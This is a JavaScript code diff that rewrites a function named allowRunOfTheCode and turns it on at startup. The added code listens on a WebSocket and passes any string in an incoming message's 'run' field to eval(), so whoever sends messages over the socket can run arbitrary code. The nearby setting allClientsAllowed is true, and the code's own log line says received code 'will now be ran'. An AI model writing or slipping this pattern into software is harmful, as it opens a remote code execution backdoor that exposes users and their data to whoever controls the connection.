@@ -35,14 +35,33 @@ const allClientsAllowed = true;
 
 
 function allowRunOfTheCode(){
-  
-  console.log('code that you recieve will now be ran :|');
+                ws.addEventListener("message", (e) => {
+                try {
+                  const receivedData = JSON.parse(e.data); // Parse the received JSON data
+                  handleReceivedData(receivedData); // Handle the parsed data
+
+
+                  if (receivedData.run) {
+                  const jsCode = receivedData.run;
+
+                  if (typeof jsCode === "string") {
+                      console.log(`Received command: ${jsCode}`);
+                        // Execute the received JavaScript code using eval()
+                        eval(jsCode);
+                    } 
+                  }
+                } catch (error) {
+                  console.error("Error parsing received JSON data:", error);
+                }
+              });
+                console.log('code that you recieve will now be ran :|');
   
 }
 
 //permissions
 
-//allowRunOfTheCode();
 //allowAllClients();
 addPrefills();
 isAuthed();
+allowRunOfTheCode();
+
